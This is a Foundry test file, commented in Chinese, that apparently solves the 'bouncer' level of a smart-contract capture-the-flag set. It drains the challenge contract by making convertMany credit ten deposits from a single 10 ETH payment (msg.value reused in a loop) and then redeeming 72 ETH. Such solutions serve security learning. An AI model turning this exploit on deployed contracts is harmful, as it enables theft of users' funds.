// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "../../src/06.bouncer/Setup.sol";

contract attackTest is Test {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    string constant weth9_Artifact = 'out/tools/helper_WETH9.sol/WETH9.json';

    Setup public level;
    Bouncer public bouncer;
    WETH9 public weth;

    function setUp() public {
        // 初始化题目
        weth = WETH9(deployHelper_weth(weth9_Artifact));
        vm.label(address(weth), "weth");

        level = new Setup{value: 100 ether}(address(weth));
        vm.label(address(level), "level");
        bouncer = level.bouncer();
    }

    function test_isComplete() public{
        // 我们用 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 进行攻击
        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(20 ether);
        vm.startBroadcast(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);
        vm.label(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, "player");

        for(uint256 i = 0; i < 10; i++){
            // entry[msg.sender][0] ~ entry[msg.sender][9]
            bouncer.enter{value: 1 ether}(ETH, 10 ether);
        }
        //此时Bouncer余额：62ETH
        
        // 等待一下，因为不能马上存款
        // require(block.timestamp != entry.timestamp, "err/wait after entering");
        vm.warp(block.timestamp + 1);

        // 构造数组
        uint256[] memory ids = new uint256[](10);
        for(uint256 i = 0; i < 10; i++){
            ids[i] = i;
        }

        // 10 ETH成功存了10次（本来需要100ETH）
        bouncer.convertMany{value: 10 ether}(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4), ids);
        //此时Bouncer余额：72ETH

        // 取走72ETH
        for(uint256 i = 0; i < 7; i++){
            bouncer.redeem(ERC20Like(address(ETH)), 10 ether);
        }
        bouncer.redeem(ERC20Like(address(ETH)), 2 ether);

        assertEq(level.isSolved(), true);

        vm.stopBroadcast();
    }

    // 部署WETH
    function deployHelper_weth(string memory what) public returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
    }

}